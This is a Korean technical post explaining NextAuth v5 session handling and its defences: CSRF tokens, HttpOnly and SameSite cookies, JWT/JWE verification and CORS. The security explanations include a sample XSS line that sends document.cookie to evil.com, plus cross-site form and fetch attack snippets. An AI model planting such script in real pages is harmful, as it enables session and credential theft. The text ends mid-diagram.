---
title: 'NextAuth 인증 보안 완전 정리'
date: '2026-02-11'
category: '보안/인증'
tags: ['NextAuth', 'JWT', 'CSRF', 'HttpOnly', 'SameSite', 'Cookie', 'Authentication', 'Security']
description: 'NextAuth 5의 인증 처리 흐름과 보안 메커니즘(JWT, CSRF, HttpOnly Cookie, SameSite)을 상세하게 정리한다'
status: 'in-progress'
---

# NextAuth 인증 보안 완전 정리

> NextAuth는 Next.js 애플리케이션의 세션 관리 프록시로, 외부 백엔드 API가 발급한 토큰을 암호화된 쿠키(JWT)로 안전하게 관리한다. 이 글에서는 NextAuth의 인증 처리 흐름과 이를 보호하는 보안 메커니즘(CSRF 토큰, HttpOnly 쿠키, SameSite 속성, JWT 검증)을 상세하게 정리한다.

## 목차

- [개요](#개요)
- [NextAuth 초기화와 핵심 유틸리티](#nextauth-초기화와-핵심-유틸리티)
- [API Route 동작 원리](#api-route-동작-원리)
- [인증 흐름 상세](#인증-흐름-상세)
- [JWT 콜백과 토큰 관리](#jwt-콜백과-토큰-관리)
- [Session 콜백과 데이터 노출 제어](#session-콜백과-데이터-노출-제어)
- [보안 메커니즘 1: CSRF 방어](#보안-메커니즘-1-csrf-방어)
- [보안 메커니즘 2: HttpOnly Cookie](#보안-메커니즘-2-httponly-cookie)
- [보안 메커니즘 3: SameSite 속성](#보안-메커니즘-3-samesite-속성)
- [보안 메커니즘 4: JWT 검증](#보안-메커니즘-4-jwt-검증)
- [CORS와 CSRF의 관계](#cors와-csrf의-관계)
- [전체 보안 계층 구조](#전체-보안-계층-구조)
- [요약](#요약)

## 개요

**NextAuth**(v5, beta)는 Next.js 애플리케이션에서 인증과 세션 관리를 담당하는 라이브러리이다. NextAuth 자체가 인증을 수행하는 것이 아니라, 외부 백엔드 API를 호출하고 그 결과(토큰)를 세션 시스템에 안전하게 담아 관리하는 **"세션 관리 프록시"** 역할을 한다.

핵심 특징:
- **JWT 전략 세션** — 서버 사이드에 세션 상태를 저장하지 않는다 (Stateless)
- **암호화된 쿠키** — 세션 토큰은 `NEXTAUTH_SECRET`으로 암호화하여 브라우저 쿠키에 저장한다
- **자동 토큰 갱신** — 백엔드 토큰 만료 전 자동으로 리프레시한다
- **다중 보안 계층** — HttpOnly, SameSite, CSRF 토큰, JWE 암호화를 조합하여 방어한다

## NextAuth 초기화와 핵심 유틸리티

### NextAuth() 호출

```ts
// src/lib/auth.ts
export const { handlers, signIn, signOut, auth } = NextAuth({
  providers: [Credentials({ ... })],
  callbacks: { jwt, session },
  session: { strategy: 'jwt', maxAge: 30 * 24 * 60 * 60 }, // 30일
})
```

`NextAuth()` 함수를 호출하면 4개의 핵심 유틸리티가 반환된다.

| export | 용도 | 사용 환경 |
|--------|------|-----------|
| `handlers` | GET/POST API 라우트 핸들러 | `api/auth/[...nextauth]/route.ts` |
| `signIn` | 프로그래밍 방식 로그인 트리거 | Server Action (서버) |
| `signOut` | 프로그래밍 방식 로그아웃 | 서버 |
| `auth` | 현재 세션 조회 / 미들웨어 래퍼 | 서버 컴포넌트, 미들웨어 |

> **Q: `signIn`이 서버용과 클라이언트용으로 구분되는 이유는?**
> `@/lib/auth`에서 import하는 `signIn`은 NextAuth() 반환값으로 서버에서만 동작한다. `next-auth/react`의 `signIn`은 클라이언트용으로 내부적으로 API Route를 HTTP 호출하는 방식이다. 이 프로젝트에서는 Server Action에서 서버용 `signIn`을 사용한다.

## API Route 동작 원리

### Catch-All Dynamic Route

```ts
// src/app/api/auth/[...nextauth]/route.ts
import { handlers } from '@/lib/auth'
export const { GET, POST } = handlers
```

`[...nextauth]`는 Next.js의 **Catch-All Dynamic Route** 문법이다. `/api/auth/` 뒤에 오는 모든 경로 세그먼트를 캡처한다.

```
/api/auth/session             → nextauth = ['session']
/api/auth/signin              → nextauth = ['signin']
/api/auth/signout             → nextauth = ['signout']
/api/auth/callback/credentials → nextauth = ['callback', 'credentials']
/api/auth/csrf                → nextauth = ['csrf']
/api/auth/providers           → nextauth = ['providers']
```

### 자동 생성되는 엔드포인트

NextAuth는 `handlers` 내부에서 URL 경로를 파싱하여 어떤 동작을 수행할지 자동으로 분기한다.

| 엔드포인트 | 메서드 | 역할 |
|------------|--------|------|
| `/api/auth/session` | GET | 현재 세션 반환 (`useSession()`이 호출) |
| `/api/auth/providers` | GET | 사용 가능한 인증 공급자 목록 |
| `/api/auth/csrf` | GET | CSRF 토큰 발급 |
| `/api/auth/signin` | GET | 기본 로그인 페이지 (커스텀 설정 시 리다이렉트) |
| `/api/auth/signout` | GET | 기본 로그아웃 페이지 |
| `/api/auth/callback/credentials` | POST | Credentials 로그인 검증 |
| `/api/auth/signout` | POST | 로그아웃 실행 |

### GET /api/auth/session — 가장 자주 호출되는 엔드포인트

`useSession()` 훅을 사용하면 `SessionProvider`가 이 엔드포인트를 호출한다.

```
useSession() 호출
  ↓
SessionProvider 내부: fetch('/api/auth/session')
  ↓
NextAuth handlers.GET 실행
  ↓
1. 요청의 쿠키에서 authjs.session-token 추출
2. NEXTAUTH_SECRET으로 JWT 복호화
3. jwt 콜백 실행 (토큰 만료 체크 → 갱신)
4. session 콜백 실행 (JWT → Session 변환)
5. JSON 응답 반환
```

호출 시점:
- 페이지 첫 로드 시
- `useSession()` 훅이 마운트될 때
- `update()` 호출 시 (세션 수동 갱신)
- 브라우저 탭이 다시 포커스될 때 (`SessionProvider`의 `refetchOnWindowFocus`)

### POST /api/auth/callback/credentials — 로그인 처리

Server Action에서 `signIn('credentials', {...})`을 호출하면 트리거된다. 이때 `signIn()`은 API Route를 HTTP로 호출하는 게 아니라, **NextAuth 내부 로직을 같은 서버 프로세스에서 직접 실행**한다.

```
signIn('credentials', { username, password, redirect: false })
  ↓
1. CSRF 토큰 검증
2. credentials 파라미터 추출
3. authorize() 콜백 실행
4. 성공 시:
   a. jwt 콜백 실행 (초기 토큰 생성)
   b. JWT를 NEXTAUTH_SECRET으로 암호화
   c. Set-Cookie 헤더로 쿠키 설정
   d. 성공 응답 반환
5. 실패 시:
   → AuthError로 래핑하여 에러 반환
```

로그인 성공 시 설정되는 쿠키:

```
Set-Cookie: authjs.session-token=eyJ...(암호화된 JWT)...;
  Path=/;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Max-Age=2592000  (30일)
```

### POST /api/auth/signout — 로그아웃

NextAuth의 `signOut()`은 **쿠키만 삭제**한다. 백엔드 토큰 무효화는 별도로 처리해야 하므로, 이 프로젝트에서는 `onLogout()` 함수에서 백엔드 API를 먼저 호출한 후 `signOut()`을 실행한다.

```
Set-Cookie: authjs.session-token=; Path=/; Max-Age=0  ← 쿠키 삭제
```

## 인증 흐름 상세

### authorize() 콜백 — NextAuth 인증의 핵심

`authorize()` 콜백은 Credentials Provider에서 사용자 인증을 수행하는 함수이다. NextAuth 자체는 인증을 하지 않고, `authorize()`에서 외부 백엔드 API를 호출하여 그 결과를 NextAuth의 세션 시스템에 담아준다.

```ts
// authorize()가 반환하는 User 객체
return {
  id: credentials.username,
  name: credentials.username,
  email: null,
  accessToken: result.data.accessToken,    // 백엔드 JWT
  refreshToken: result.data.refreshToken,  // 백엔드 리프레시 토큰
}
```

### 3가지 로그인 모드

**A. 일반 회원 로그인**

백엔드 `POST /v1/login` 호출:
- 요청: `{ memberId, password, connectionIp, loginChannel: '901001', mmAgreeEvt: 0 }`
- 응답: `{ code: 'R20000', data: { accessToken, refreshToken } }`

**B. 게스트(비회원) 로그인**

`credentials.type === 'guest'`일 때 `guestTempLogin()` API 호출하여 임시 토큰을 발급받는다. 비회원 주문용으로 `memberType: 'ORDER'`이 설정된다.

**C. 테스트 모드 (개발 환경만)**

`TEST_REFRESH_TOKEN` 환경변수로 자동 인증을 우회한다.

### 클라이언트 → 서버 → 백엔드 전체 흐름

```
클라이언트 (SignInForm)
  │ handleSignIn(username, password) 호출
  ↓
Server Action (actions.ts) ─── 서버에서 실행
  │ signIn('credentials', { username, password, redirect: false })
  ↓
NextAuth 내부: authorize() 실행
  │ 백엔드 /v1/login API 호출
  ↓
성공 → jwt 콜백 → session 콜백 → 쿠키 설정
  │
  ↓
클라이언트: await update() → router.push('/') → router.refresh()
```

### 에러 코드

| 코드 | 의미 |
|------|------|
| R20000 | 성공 |
| R40106 | 로그인 실패 |
| R40107 | 비밀번호 5회 연속 실패 |
| R40108 | 사이트 이관 동의 필요 |

## JWT 콜백과 토큰 관리

### 초기 로그인 시 (user 존재)

```ts
async jwt({ token, user }) {
  if (user) {
    // authorize()의 반환값에서 백엔드 토큰을 JWT에 저장
    token.accessToken = user.accessToken
    token.refreshToken = user.refreshToken

    // 백엔드 accessToken을 직접 디코딩하여 회원정보 추출
    const decoded = decodeJWT(user.accessToken)
    token.name = decoded.MM_MEM_NM         // 회원명
    token.roles = decoded.ROLES            // 권한
    token.memberType = decoded.MM_MEM_TYPE // 회원유형
    // ... 기타 정보

    return token  // NextAuth가 이 token을 쿠키에 암호화하여 저장
  }
}
```

이 `token` 객체는 `NEXTAUTH_SECRET`으로 암호화되어 브라우저 쿠키(`authjs.session-token`)에 저장된다.

### 이후 모든 요청 시 (user가 undefined)

페이지 이동이나 `useSession()` 호출마다 JWT 콜백이 실행된다.

```ts
async jwt({ token, user }) {
  if (user) { /* 초기 로그인 처리 */ }

  // 1. 토큰 만료 확인 (5분 버퍼)
  if (!isTokenExpired(token.accessToken, 5)) {
    return token  // 유효하면 그대로 반환
  }

  // 2. 만료됐으면 리프레시
  try {
    const newTokens = await refreshAccessToken(token.refreshToken)
    return { ...token, ...newTokens }  // 새 토큰으로 교체
  } catch (error) {
    return token  // 리프레시 실패 시 기존 토큰 반환
  }
}
```

> **Q: 5분 버퍼란?**
> `isTokenExpired(token, 5)`는 토큰의 `exp` 클레임에서 현재 시간을 뺀 값이 5분 이하인지 확인한다. 실제 만료 전에 선제적으로 갱신하여 사용자가 토큰 만료를 인지하지 못하게 한다.

### 자동 토큰 갱신 원리

```
매 요청마다:
  jwt 콜백 실행
    ↓
  isTokenExpired(accessToken, 5)  ← 만료 5분 전인가?
    ├─ 아니오 → 기존 토큰 반환
    └─ 예 → refreshAccessToken(refreshToken)
              ↓
            백엔드 /v1/login/refresh 호출
              ↓
            새 accessToken + refreshToken 발급
              ↓
            JWT에 새 토큰 저장 → 쿠키 갱신
```

사용자는 토큰 갱신을 전혀 인지하지 못한다. 매 요청마다 NextAuth가 자동으로 토큰 만료를 체크하고 갱신한다.

## Session 콜백과 데이터 노출 제어

JWT 콜백 이후 session 콜백이 실행된다.

```ts
async session({ session, token }) {
  session.accessToken = token.accessToken      // API 호출용
  session.memberType = token.memberType        // 회원/비회원 구분
  session.user.id = token.id
  session.user.name = token.name
  session.user.roles = token.roles
  // ...

  // 주의: token.refreshToken은 session에 넣지 않음 (보안)
  return session
}
```

### 클라이언트에 노출되는 데이터 vs 서버에만 존재하는 데이터

| 데이터 | 위치 | 클라이언트 접근 |
|--------|------|-----------------|
| accessToken | Session | O (API 호출용) |
| memberType, memberStatus | Session | O |
| user.id, user.name, user.roles | Session | O |
| user.phone, user.email | Session | O |
| **refreshToken** | **JWT 내부만** | **X (의도적 제외)** |

> **Q: refreshToken을 클라이언트에 노출하지 않는 이유는?**
> refreshToken은 accessToken이 만료되었을 때 새로운 토큰을 발급받을 수 있는 "마스터 키"이다. 만약 XSS 공격으로 클라이언트의 JavaScript가 탈취당하더라도 refreshToken은 서버 사이드 JWT 내부에만 존재하므로 안전하다. accessToken은 유효기간이 짧아 피해가 제한적이다.

## 보안 메커니즘 1: CSRF 방어

### CSRF(Cross-Site Request Forgery)란?

**사이트 간 요청 위조** 공격이다. 사용자가 로그인된 상태에서 악의적인 사이트가 사용자의 인증 정보(쿠키)를 이용해 원하지 않는 요청을 보내는 공격이다.

### 공격 시나리오

```
1. 사용자가 sdijbooks.com에 로그인 (세션 쿠키 저장)

2. 사용자가 악성 사이트 evil.com 방문

3. evil.com의 HTML에 숨겨진 코드:
   <form action="https://sdijbooks.com/api/auth/signout" method="POST">
     <input type="submit" value="무료 쿠폰 받기">
   </form>

4. 사용자가 "무료 쿠폰 받기" 클릭
   → 브라우저가 sdijbooks.com으로 POST 요청 전송
   → 브라우저가 자동으로 sdijbooks.com의 쿠키를 포함
   → 서버는 정상 요청으로 인식 → 로그아웃 처리됨
```

브라우저는 해당 도메인의 쿠키를 **자동으로 포함**하므로, 다른 사이트에서 보낸 요청도 인증된 요청처럼 보인다.

### NextAuth의 CSRF 토큰 방어

NextAuth는 모든 POST 요청에 CSRF 토큰을 필수로 요구한다.

```
[정상적인 흐름]
1. 클라이언트: GET /api/auth/csrf
   → 응답: { csrfToken: "abc123..." }  ← 해당 세션에만 유효한 일회성 토큰

2. 클라이언트: POST /api/auth/signout
   → Body: { csrfToken: "abc123..." }

3. 서버: csrfToken 검증 → 일치하면 실행, 불일치하면 거부

[CSRF 공격 시도]
evil.com → POST /api/auth/signout
  → 쿠키는 자동 전송되지만
  → csrfToken을 모르므로 Body에 포함 불가
  → 서버가 거부 ✅ 방어 성공
```

> **Q: 공격자가 CSRF 토큰을 가져올 수 없는 이유는?**
> CSRF 토큰은 JavaScript로만 읽을 수 있다. 브라우저의 **동일 출처 정책(Same-Origin Policy)** 때문에 evil.com의 JavaScript는 sdijbooks.com의 응답을 읽을 수 없다. 따라서 공격자는 CSRF 토큰을 알 수 없다.

## 보안 메커니즘 2: HttpOnly Cookie

### HttpOnly란?

쿠키에 설정할 수 있는 보안 플래그로, **JavaScript에서 해당 쿠키에 접근하는 것을 차단**한다. "HTTP 전송에만(Only) 사용된다"는 의미이다.

### 일반 쿠키 vs HttpOnly 쿠키

**일반 쿠키**:

```
Set-Cookie: theme=dark; Path=/

→ JavaScript에서 접근 가능:
  document.cookie  // "theme=dark"

→ XSS 공격 시 탈취 가능:
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
```

**HttpOnly 쿠키**:

```
Set-Cookie: authjs.session-token=eyJ...; Path=/; HttpOnly

→ JavaScript에서 접근 불가:
  document.cookie  // "" (HttpOnly 쿠키는 보이지 않음)

→ XSS 공격으로 탈취 불가:
  <script>
    document.cookie  // 세션 토큰이 여기에 없음
  </script>
```

### 비교 표

| 특성 | 일반 쿠키 | HttpOnly 쿠키 |
|------|-----------|---------------|
| `document.cookie`로 읽기 | O | **X** |
| JavaScript로 수정/삭제 | O | **X** |
| HTTP 요청 시 자동 전송 | O | O |
| 서버에서 설정/삭제 | O | O |

> **Q: HttpOnly인데 클라이언트에서 어떻게 accessToken을 사용하나?**
> `useSession()`은 쿠키를 직접 읽지 않는다. `GET /api/auth/session` HTTP 요청을 보내면, 브라우저가 쿠키를 자동으로 요청에 포함한다(HttpOnly여도 HTTP 전송은 됨). 서버(NextAuth)가 쿠키를 복호화하고 필요한 정보만 JSON으로 응답한다. 쿠키를 직접 읽는 게 아니라 서버에게 "내 세션 정보 줘"라고 요청하는 구조이다.

### NextAuth가 설정하는 쿠키 플래그

```
Set-Cookie: authjs.session-token=eyJ...;
  Path=/;
  HttpOnly;       ← JS에서 접근 불가
  Secure;         ← HTTPS에서만 전송
  SameSite=Lax;   ← 크로스 사이트 POST 요청 시 전송 안 함
  Max-Age=2592000   ← 30일 유효
```

| 플래그 | 방어 대상 | 설명 |
|--------|-----------|------|
| HttpOnly | XSS 공격 | JavaScript에서 쿠키 탈취 방지 |
| Secure | 중간자 공격 | HTTP(평문)로는 쿠키 전송 안 함 |
| SameSite=Lax | CSRF 공격 | 다른 사이트에서의 POST 요청 시 쿠키 미전송 |

## 보안 메커니즘 3: SameSite 속성

### SameSite란?

브라우저가 **크로스 사이트 요청** 시 쿠키를 포함할지 말지를 결정하는 쿠키 속성이다.

### "Same Site"와 "Cross Site"의 정의

**Site ≠ Origin** 이다.

```
Origin = 프로토콜 + 도메인 + 포트 (전부 일치해야 Same Origin)
Site   = 도메인의 eTLD+1 부분만 (더 느슨한 비교)
```

**eTLD+1**: effective Top-Level Domain + 1단계. `com`, `co.kr`, `github.io` 등이 eTLD이고, 그 바로 앞 한 단계까지가 "사이트"이다.

```
https://sdijbooks.com          → Site: sdijbooks.com
https://api.sdijbooks.com      → Site: sdijbooks.com (같은 사이트)
https://dev.sdijbooks.com:3000 → Site: sdijbooks.com (같은 사이트)
https://evil.com               → Site: evil.com (다른 사이트)
https://sdijbooks.co.kr        → Site: sdijbooks.co.kr (다른 사이트)
```

### 3가지 SameSite 옵션

#### SameSite=Strict — 가장 엄격

```
Set-Cookie: session=abc; SameSite=Strict
```

**규칙**: 다른 사이트에서 오는 **모든** 요청에 쿠키를 포함하지 않는다.

| 요청 출처 | 메서드 | 쿠키 전송 |
|-----------|--------|-----------|
| 같은 사이트 | 모든 메서드 | O |
| 다른 사이트 링크 클릭 | GET | **X** |
| 다른 사이트 form POST | POST | **X** |
| 다른 사이트 fetch | 모든 메서드 | **X** |

```
[시나리오]
사용자가 evil.com에서 sdijbooks.com 링크 클릭:
→ 쿠키 미포함 → 로그인이 풀린 상태로 페이지 표시

사용자가 주소창에 직접 sdijbooks.com 입력:
→ 쿠키 포함 ✅ (직접 입력은 Same-Site)
```

- **장점**: CSRF 완벽 차단
- **단점**: 다른 사이트에서 링크로 들어오면 로그인이 풀려 보임 (UX 나쁨)

#### SameSite=Lax — 균형잡힌 기본값 (NextAuth 사용)

```
Set-Cookie: authjs.session-token=abc; SameSite=Lax
```

**규칙**: 다른 사이트에서 오는 **"안전한" 최상위 탐색(GET)**에만 쿠키를 포함한다.

| 요청 출처 | 유형 | 쿠키 전송 |
|-----------|------|-----------|
| 같은 사이트 | 모든 요청 | O |
| 다른 사이트 → 링크 클릭 (GET) | 최상위 탐색 | O |
| 다른 사이트 → form POST | 최상위 탐색 | **X** |
| 다른 사이트 → iframe | 서브 요청 | **X** |
| 다른 사이트 → fetch/XHR | 서브 요청 | **X** |
| 다른 사이트 → `<img>` GET | 서브 리소스 | **X** |

- **장점**: CSRF 방어 + 좋은 UX (링크 클릭 시 로그인 유지)
- **단점**: GET 요청에는 쿠키가 전송되므로, GET으로 상태를 변경하면 위험

> **Q: NextAuth가 Strict가 아닌 Lax를 선택한 이유는?**
> Strict를 사용하면 카카오톡이나 Google 검색 등 외부 사이트에서 링크를 클릭했을 때 쿠키가 전송되지 않아 매번 로그인이 풀려 보인다. Lax는 GET 최상위 탐색에서는 쿠키를 전송하되, POST 요청은 차단하여 CSRF 방어와 UX 사이의 균형을 맞춘다. 부족한 부분은 CSRF 토큰으로 이중 보호한다.

#### SameSite=None — 제한 없음

```
Set-Cookie: tracking=xyz; SameSite=None; Secure  ← Secure 필수
```

**규칙**: 모든 크로스 사이트 요청에 쿠키를 포함한다.

- 사용 사례: 서드파티 인증(OAuth Provider), 크로스 도메인 임베드(결제 위젯), 광고 트래킹
- **위험**: CSRF 방어가 전혀 없으므로 반드시 다른 방어 수단이 필요하다

### 3가지 옵션 비교 요약

|  | Strict | Lax | None |
|--|--------|-----|------|
| 같은 사이트 | O | O | O |
| 다른 사이트 → 링크 클릭(GET) | **X** | O | O |
| 다른 사이트 → form POST | **X** | **X** | O |
| 다른 사이트 → fetch/XHR | **X** | **X** | O |
| 다른 사이트 → iframe | **X** | **X** | O |
| CSRF 방어 | 완벽 | 거의 완벽 | 없음 |
| UX | 나쁨 | 좋음 | 제한 없음 |
| Secure 필수 | 아니오 | 아니오 | 예 |

### 브라우저 기본값

| 브라우저 | SameSite 미설정 시 기본값 |
|----------|---------------------------|
| Chrome 80+ (2020~) | Lax |
| Firefox 69+ | Lax |
| Safari | Strict에 가까운 자체 정책 |
| Edge (Chromium) | Lax |

과거에는 기본값이 None이었지만, 2020년부터 대부분의 브라우저가 Lax로 변경했다.

## 보안 메커니즘 4: JWT 검증

### JWT 구조

JWT는 `.`으로 구분된 3개의 파트로 구성된다. 각 파트는 Base64URL 인코딩되어 있다 (**암호화가 아님**).

```
eyJhbGciOiJIUzI1NiJ9.eyJNTV9NRU1fSUQiOiJ0ZXN0MTIzNCJ9.abc123signature
────────────────────  ──────────────────────────────────  ────────────────
      Header                     Payload                    Signature
```

```
Header (디코딩):   { "alg": "HS256", "typ": "JWT" }
Payload (디코딩):  { "MM_MEM_ID": "test1234", "exp": 1718..., ... }
Signature:         HMAC-SHA256(header + "." + payload, 비밀키)
```

### 1. 서명 검증 (Signature Verification) — "이 토큰이 진짜인가?"

#### 서명 생성 과정 (토큰 발급 시)

```
Signature = HMAC-SHA256(
  base64url(Header) + "." + base64url(Payload),
  "서버만-아는-비밀키"
)
```

#### 서명 검증 과정 (토큰 수신 시)

```
1. 받은 JWT를 . 으로 분리
   Header부분 = "eyJhbGciOiJIUzI1NiJ9"
   Payload부분 = "eyJNTV9NRU1fSUQi..."
   받은Signature = "abc123signature"

2. 같은 비밀키로 서명을 다시 계산
   계산된Signature = HMAC-SHA256(Header부분 + "." + Payload부분, "비밀키")

3. 비교
   받은Signature === 계산된Signature ?
   → 일치: 토큰이 위변조되지 않음 ✅
   → 불일치: 누군가 payload를 조작함 ❌ 거부
```

> **Q: 왜 위변조가 불가능한가?**
> 공격자가 payload의 `ROLES`를 `["USER"]`에서 `["ADMIN"]`으로 변경하면, payload가 변경되므로 Signature도 달라져야 한다. 하지만 공격자는 비밀키를 모르므로 올바른 Signature를 만들 수 없다. 서버가 검증 시 불일치를 감지하여 거부한다.

### 2. 클레임 검증 (Claims Verification) — "이 토큰이 유효한가?"

서명이 올바르더라도 추가 검증이 필요하다.

```json
{
  "exp": 1718000000,         // 만료 시간 (Expiration)
  "iat": 1717900000,         // 발급 시간 (Issued At)
  "nbf": 1717900000,         // 사용 시작 시간 (Not Before)
  "iss": "api.sdijbooks.com", // 발급자 (Issuer)
  "aud": "sdijbooks.com",    // 수신자 (Audience)
  "sub": "test1234"          // 주체 (Subject)
}
```

| 검증 항목 | 조건 | 목적 |
|-----------|------|------|
| exp | `exp > 현재시간` | 만료되지 않았는가 |
| iat | `iat <= 현재시간` | 미래에서 발급된 건 아닌가 |
| nbf | `nbf <= 현재시간` | 사용 가능한 시점인가 |
| iss | `iss === 예상 발급자` | 올바른 서버에서 발급했는가 |
| aud | `aud === 예상 수신자` | 이 서비스용 토큰인가 |

### 서명 알고리즘 종류

#### HMAC (대칭키) — HS256, HS384, HS512

하나의 비밀키로 서명 생성과 검증을 모두 수행한다.

```
발급 서버: HMAC(payload, SECRET_KEY) → Signature
검증 서버: HMAC(payload, SECRET_KEY) → 같은 Signature?
```

- 발급자와 검증자가 같은 키를 공유
- 빠른 속도
- 단일 서버 또는 신뢰할 수 있는 서비스 간 사용에 적합

#### RSA (비대칭키) — RS256, RS384, RS512

개인키(Private Key)로 서명하고, 공개키(Public Key)로 검증한다.

```
발급 서버: RSA_SIGN(payload, PRIVATE_KEY) → Signature
검증 서버: RSA_VERIFY(payload, Signature, PUBLIC_KEY) → true/false
```

- 개인키는 발급 서버만 보유
- 공개키는 누구나 가질 수 있음
- 발급 서버와 검증 서버를 분리할 수 있음
- **마이크로서비스 환경에 적합**

#### ECDSA (타원곡선) — ES256, ES384, ES512

RSA와 같은 비대칭키 방식이지만 키 크기가 작다.

- RSA보다 짧은 키로 동일 보안 수준
- 토큰 크기 절약
- 모바일/IoT에 적합

### 이 프로젝트의 2가지 JWT

이 프로젝트에는 두 종류의 JWT가 존재한다.

#### A. 백엔드 JWT (accessToken, refreshToken)

백엔드 API 서버가 발급하는 일반 JWT(서명만)이다.

```
[검증 주체: 백엔드 서버]
→ Next.js 프론트엔드에서는 서명 검증을 하지 않음
→ decodeJWT()로 payload만 읽음 (회원정보 추출, 만료 시간 확인용)
→ API 요청 시 Authorization: Bearer {accessToken}으로 전달
→ 백엔드가 자체 비밀키로 서명 검증
```

```ts
// src/utils/jwt.ts
export function decodeJWT(token: string) {
  const parts = token.split('.')
  const payload = parts[1]
  // Base64 디코딩만 수행 — 서명 검증 없음
  return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'))
}
```

> **Q: 프론트엔드에서 서명 검증을 안 하는 이유는?**
> 백엔드의 비밀키를 프론트엔드에 둘 수 없다(유출 위험). 어차피 API 호출 시 백엔드가 직접 검증하므로, 프론트엔드는 토큰 내용을 "참고용"으로만 읽으면 된다.

#### B. NextAuth JWT (세션 쿠키)

NextAuth가 `NEXTAUTH_SECRET`으로 **암호화**하여 쿠키에 저장하는 토큰이다.

- **JWE(JSON Web Encryption)** 사용 — 일반 JWT(서명만)와 달리 **payload 자체가 암호화**됨
- **A256CBC-HS512** 알고리즘 (AES-256 + HMAC-SHA512)
- `NEXTAUTH_SECRET` 없이는 내용 자체를 읽을 수 없음

```
[일반 JWT] — 서명만
Header.Payload.Signature
→ Payload는 Base64로 인코딩 (누구나 디코딩 가능)
→ Signature로 위변조만 방지

[NextAuth JWT] — 암호화 (JWE)
전체가 암호화됨
→ NEXTAUTH_SECRET 없이는 내용 자체를 읽을 수 없음
→ 위변조 방지 + 내용 은닉
```

| JWT | 발급자 | 검증자 | 검증 방식 | 프론트에서의 역할 |
|-----|--------|--------|-----------|-------------------|
| 백엔드 accessToken | 백엔드 API 서버 | 백엔드 API 서버 | 서명 검증 (비밀키) | payload 읽기만 (서명 검증 X) |
| 백엔드 refreshToken | 백엔드 API 서버 | 백엔드 API 서버 | 서명 검증 (비밀키) | 갱신 요청 시 전달만 |
| NextAuth 세션 JWT | NextAuth (프론트 서버) | NextAuth (프론트 서버) | JWE 복호화 (NEXTAUTH_SECRET) | 쿠키로 자동 관리 (직접 접근 X) |

## CORS와 CSRF의 관계

### CORS(Cross-Origin Resource Sharing)란?

브라우저가 **다른 출처(Origin)**의 서버로 요청을 보낼 때, 서버가 허용하는지 확인하는 메커니즘이다.

### CORS가 있어도 CSRF는 완전히 막히지 않는다

핵심: **CORS는 응답 읽기를 차단하지, 요청 전송 자체를 항상 막는 건 아니다.**

브라우저는 요청을 두 종류로 구분한다.

#### Simple Request (단순 요청) — CORS가 못 막음

다음 조건을 **모두** 만족하면 Simple Request이다:
- 메서드: GET, POST, HEAD 중 하나
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 중 하나
- 커스텀 헤더 없음

```
evil.com:
<form action="https://sdijbooks.com/api/auth/signout" method="POST">

사용자가 클릭하면:
  1. 브라우저가 POST 요청을 전송   ← 전송됨!
  2. 쿠키도 자동으로 포함           ← 포함됨!
  3. 서버가 요청을 처리             ← 처리됨!
  4. 응답을 evil.com에서 읽으려 함
  5. CORS가 응답 읽기를 차단       ← 여기서만 차단

→ 서버는 이미 요청을 처리했음 (피해 발생)
→ CORS는 응답만 차단했을 뿐
```

#### Preflight Request (사전 요청) — CORS가 막음

다음 조건 중 하나라도 해당되면 브라우저가 먼저 **OPTIONS 요청**을 보낸다:
- Content-Type이 `application/json`인 경우
- 커스텀 헤더가 있는 경우 (예: `Authorization: Bearer ...`)
- PUT, DELETE, PATCH 메서드인 경우

```
evil.com:
fetch('https://sdijbooks.com/api/some-action', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include'
})

1. 브라우저: OPTIONS 요청 전송 (Preflight)
2. 서버 응답: Access-Control-Allow-Origin에 evil.com 없음
3. 브라우저: 본 요청 전송 차단 ✅ 방어 성공
```

### 비교 표

| 공격 방식 | CORS가 막나? | 이유 |
|-----------|-------------|------|
| `<form>` POST (기본 Content-Type) | **X 못 막음** | Simple Request → Preflight 없이 바로 전송 |
| `<img src="https://...">` GET | **X 못 막음** | Simple Request → 요청 전송됨 (응답만 차단) |
| `fetch()` + JSON Content-Type | O 막음 | Preflight 필요 → OPTIONS에서 차단 |
| `fetch()` + Authorization 헤더 | O 막음 | Preflight 필요 → OPTIONS에서 차단 |

### NextAuth의 3중 방어

| 방어 계층 | 역할 | 한계 |
|-----------|------|------|
| 1층: SameSite=Lax 쿠키 | evil.com에서 보내는 POST에 쿠키 미포함 | 일부 브라우저/설정에서 지원 불완전 |
| 2층: CSRF 토큰 | 모든 POST에 토큰 필수 | 가장 확실한 방어 |
| 3층: CORS | `fetch()` + JSON 요청은 Preflight로 차단 | `<form>` 전송은 못 막음 |

## 전체 보안 계층 구조

```
┌──────────────────────────────────────────────────────────────┐
│                     보안 계층 구조                            │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1층: HttpOnly + Secure 쿠키                                 │
│       → 세션 토큰을 JS에서 읽을 수 없음                      │
│       → XSS 공격으로 세션 탈취 불가                          │
│                                                              │
│  2층: SameSite=Lax                                           │
│       → 다른 사이트의 POST 요청에 쿠키 미포함                │
│       → 기본적인 CSRF 방어                                   │
│                                                              │
│  3층: CSRF 토큰                                              │
│       → 모든 POST 요청에 토큰 필수                           │
│       → SameSite로 부족한 경우를 보완                        │
│                                                              │
│  4층: JWT 암호화 (NEXTAUTH_SECRET)                           │
│       → 쿠키 내용을 탈취해도 복호화 불가                     │
│       → 토큰 위변조 불가                                     │
│                                                              │
│  5층: refreshToken 미노출                                    │
│       → session 콜백에서 의도적 제외                         │
│       → 클라이언트 코드에서 접근 불가                        │
│       → accessToken 노출 시에도 refreshToken은 안전          │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 전체 인증 흐름

```
┌───────────────────── 브라우저 (클라이언트) ──────────────────────┐
│                                                                  │
│  [쿠키: authjs.session-token = 암호화된 JWT]                     │
│                                                                  │
│  useSession() ─────────────────────┐                             │
│        ↑ session 반환              │ GET /api/auth/session       │
│        │                           ↓                             │
├────────┼───────────────────────────┼────────────────────────────┤
│        │       Next.js 서버        │                             │
│        │                           ↓                             │
│        │  ┌────────── NextAuth 내부 처리 ──────────────┐        │
│        │  │                                             │        │
│        │  │  1. 쿠키 복호화 (NEXTAUTH_SECRET)           │        │
│        │  │  2. jwt 콜백 실행                           │        │
